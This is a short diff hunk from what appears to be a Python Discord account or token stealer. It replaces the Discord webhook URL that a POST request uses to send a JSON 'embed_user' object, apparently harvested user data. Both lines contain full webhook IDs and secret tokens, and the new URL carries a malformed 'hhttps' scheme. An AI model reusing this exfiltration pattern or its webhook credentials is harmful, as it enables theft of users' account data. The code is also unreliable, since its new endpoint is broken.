@@ -804,7 +804,7 @@ def main():
                     "avatar_url": "https://file.garden/aP4c1qAZw0hKw5m_/Screenshot_2025-10-22_203649-removebg-preview.png"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1429726907062026311/QjeNA0v88GNZTuWXDcDZaLPDBKfkweyijOA9_lWwkKM4HjcRahbwuO31T4rgI6B4k_4V', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('hhttps://discord.com/api/webhooks/1432646103127560214/bspKJtKFzKLgij_XusS5hIRZqu0s4LMm41REZUnM5eYYjoTc9bBV5BbOfU9x0ic8AiYs', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
